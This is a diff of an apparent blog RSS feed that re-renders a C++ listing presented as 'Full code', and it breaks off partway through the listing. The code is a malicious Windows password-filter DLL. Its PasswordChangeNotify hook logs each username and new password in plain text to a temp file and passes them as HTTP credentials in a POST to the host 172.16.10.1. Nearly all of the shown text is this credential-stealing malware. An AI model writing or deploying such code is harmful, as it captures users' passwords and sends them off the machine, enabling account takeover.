@@ -99,88 +99,88 @@ JackJohnson:a?&#39;z_a4#RRK(mvQEsyQ8l`,JR.pes&amp;lt;;6#0$puQ%Q&amp;amp;,@ZwY(T@
 &lt;li&gt;[2] &lt;a href=&#34;%22http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx%22&#34;&gt;http://msdn.microsoft.com/en-us/library/windows/desktop/aa385096(v=vs.85).aspx&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;Full code:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;WinInet.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;ntsecapi.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
-&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;writeToLog&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; szString)
-{
-    FILE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pFile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;windows&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;temp&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;logFile.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a+&amp;#34;&lt;/span&gt;);
-    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (NULL &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; pFile)
-    {
-        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
-    }
-    fprintf(pFile, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, szString);
-    fclose(pFile);
-    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
-}
-
-
-
-&lt;span style=&#34;color:#75715e&#34;&gt;// Default DllMain implementation
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;BOOL APIENTRY &lt;span style=&#34;color:#a6e22e&#34;&gt;DllMain&lt;/span&gt;( HANDLE hModule, 
-                       DWORD  ul_reason_for_call, 
-                       LPVOID lpReserved
-                     )
-{
-    OutputDebugString(&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DllMain&amp;#34;&lt;/span&gt;);
-    &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; (ul_reason_for_call)
-    {
-        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; DLL_PROCESS_ATTACH:
-        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; DLL_THREAD_ATTACH:
-        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; DLL_THREAD_DETACH:
-        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; DLL_PROCESS_DETACH:
-            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
-    }
-    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; TRUE;
-}
-
-BOOLEAN &lt;span style=&#34;color:#66d9ef&#34;&gt;__stdcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;InitializeChangeNotify&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
-{
-    OutputDebugString(&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;InitializeChangeNotify&amp;#34;&lt;/span&gt;);
-    writeToLog(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;InitializeChangeNotify()&amp;#34;&lt;/span&gt;);
-    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; TRUE;
-}
-
-BOOLEAN &lt;span style=&#34;color:#66d9ef&#34;&gt;__stdcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PasswordFilter&lt;/span&gt;(
-    PUNICODE_STRING AccountName,
-    PUNICODE_STRING FullName,
-    PUNICODE_STRING Password,
-    BOOLEAN SetOperation )
-{
-    OutputDebugString(&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PasswordFilter&amp;#34;&lt;/span&gt;);
-    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; TRUE;
-}
-
-NTSTATUS &lt;span style=&#34;color:#66d9ef&#34;&gt;__stdcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PasswordChangeNotify&lt;/span&gt;(
-    PUNICODE_STRING UserName,
-    ULONG RelativeId,
-    PUNICODE_STRING NewPassword )
-{
-  FILE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pFile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;windows&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;temp&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;logFile.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a+&amp;#34;&lt;/span&gt;);
-  &lt;span style=&#34;color:#75715e&#34;&gt;//HINTERNET hInternet = InternetOpen(L&amp;#34;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&amp;#34;,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
-&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	HINTERNET hInternet &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; InternetOpen(&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&amp;#34;&lt;/span&gt;,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
-	HINTERNET hSession &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; InternetConnect(hInternet,&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;172.16.10.1&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;,NULL,NULL,INTERNET_SERVICE_HTTP ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
-	HINTERNET hReq &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; HttpOpenRequest(hSession,&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;,NULL,NULL,NULL,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pBuf&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SomeData&amp;#34;&lt;/span&gt;;
-
-
-
-	OutputDebugString(&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PasswordChangeNotify&amp;#34;&lt;/span&gt;);
-	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (NULL &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; pFile)
-    {
-        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
-    }
-	fprintf(pFile, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%ws:%ws&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, UserName&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Buffer,NewPassword&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Buffer);
-  fclose(pFile);
-	InternetSetOption(hSession,INTERNET_OPTION_USERNAME,UserName&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Buffer,UserName&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Length&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
-	InternetSetOption(hSession,INTERNET_OPTION_PASSWORD,NewPassword&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Buffer,NewPassword&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;Length&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;);
-	HttpSendRequest(hReq,NULL,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,pBuf,strlen(pBuf));
-
-    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;WinInet.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;ntsecapi.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;writeToLog&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; szString)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    FILE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pFile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;windows&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;temp&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;logFile.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a+&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (NULL &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; pFile)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    fprintf(pFile, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, szString);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    fclose(pFile);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// Default DllMain implementation
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;BOOL APIENTRY &lt;span style=&#34;color:#a6e22e&#34;&gt;DllMain&lt;/span&gt;( HANDLE hModule, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                       DWORD  ul_reason_for_call, 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                       LPVOID lpReserved
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                     )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    OutputDebugString(&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DllMain&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; (ul_reason_for_call)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; DLL_PROCESS_ATTACH:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; DLL_THREAD_ATTACH:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; DLL_THREAD_DETACH:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; DLL_PROCESS_DETACH:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; TRUE;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BOOLEAN &lt;span style=&#34;color:#66d9ef&#34;&gt;__stdcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;InitializeChangeNotify&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    OutputDebugString(&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;InitializeChangeNotify&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    writeToLog(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;InitializeChangeNotify()&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; TRUE;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;BOOLEAN &lt;span style=&#34;color:#66d9ef&#34;&gt;__stdcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PasswordFilter&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PUNICODE_STRING AccountName,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PUNICODE_STRING FullName,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PUNICODE_STRING Password,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    BOOLEAN SetOperation )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    OutputDebugString(&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PasswordFilter&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; TRUE;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;NTSTATUS &lt;span style=&#34;color:#66d9ef&#34;&gt;__stdcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PasswordChangeNotify&lt;/span&gt;(
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PUNICODE_STRING UserName,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    ULONG RelativeId,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    PUNICODE_STRING NewPassword )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  FILE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pFile &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; fopen(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;c:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;windows&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;temp&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;logFile.txt&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a+&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;//HINTERNET hInternet = InternetOpen(L&amp;#34;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&amp;#34;,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;	HINTERNET hInternet &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; InternetOpen(&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0&amp;#34;&lt;/span&gt;,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	HINTERNET hSession &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; InternetConnect(hInternet,&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;172.16.10.1&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;,NULL,NULL,INTERNET_SERVICE_HTTP ,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	HINTERNET hReq &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; HttpOpenRequest(hSession,&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;POST&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;,NULL,NULL,NULL,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pBuf&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SomeData&amp;#34;&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	OutputDebugString(&lt;span style=&#34;color:#e6db74&#34;&gt;L&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;PasswordChangeNotify&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (NULL &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; pFile)
